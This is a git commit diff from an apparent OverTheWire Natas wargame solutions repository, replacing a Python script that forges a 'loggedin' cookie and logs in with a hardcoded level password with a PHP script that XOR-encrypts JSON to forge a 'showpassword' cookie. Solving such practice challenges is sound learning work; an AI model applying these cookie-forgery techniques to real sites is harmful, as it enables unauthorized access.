8987b527b21165db6e7d50cbe7fbda6293c22e77
amirtamiz <amiralisadeghitamiz1397@gmail.com>
2021-05-22 03:52:50 -0700

    'exploit'

--- natas11/natas11.php
+++ natas11/natas11.php
@@ -1,7 +1,25 @@
-import requests
-exploit=requests.session()
-exploit.auth=('natas5','iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
-cookies_dict = {"loggedin": "1"}
-request=exploit.get('http://natas5.natas.labs.overthewire.org',cookies=cookies_dict)
-#password has been in the source
-print(request.text)
+<?php
+
+
+$defaultdata = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
+$text=json_encode($defaultdata);
+
+ 
+function xor_encrypt($in) {
+    $key = "qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq";
+    $text = $in;
+    $outText = null;
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+	
+	return base64_encode($outText);
+	
+}
+$cookies=xor_encrypt($text);
+echo "Set this Cookie:<br> data=".$cookies;
+
+
+?>
